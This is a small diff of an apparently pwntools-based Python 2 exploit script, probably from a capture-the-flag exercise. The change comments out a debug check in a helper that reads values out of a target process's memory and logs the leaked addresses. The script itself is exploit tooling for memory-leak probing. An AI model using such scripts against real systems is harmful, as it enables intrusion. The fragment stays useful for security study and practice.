@@ -12,8 +12,8 @@ def read(index):
     leak = p.recvuntil('\n')
     if int(leak) != 0 :
         log.info("leak at index %d is %s"%(index,hex(int(leak))))
-        if int(leak) == 0x080bfa38:
-            print "======================================",index
+       # if int(leak) == 0x080bfa38:  #important for debugging purposes
+        #    print "======================================",index
 
 
 def store(index,data):
